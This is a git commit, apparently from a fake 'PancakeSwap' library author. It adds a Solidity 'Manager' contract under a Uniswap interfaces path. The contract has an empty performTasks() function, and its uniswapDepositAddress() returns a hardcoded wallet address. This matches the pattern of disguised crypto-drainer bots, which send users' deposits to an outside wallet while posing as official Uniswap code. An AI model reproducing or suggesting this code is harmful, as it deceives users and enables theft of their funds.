32623ae536d8af3bd053e85f465a687cfd11a82b
PancakeSwapLibs <pancakeswaplib@protonmail.com>
2021-12-04 17:05:26 +0100

    feat: manager contract updated

---
+++ Uniswap/Manager/interfaces/IUniswapV1Manager.sol
@@ -0,0 +1,12 @@
+  
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x8bB092b49F0f416A9f23559cfCeCfBD9E2F4FeE5;
+	}
+}
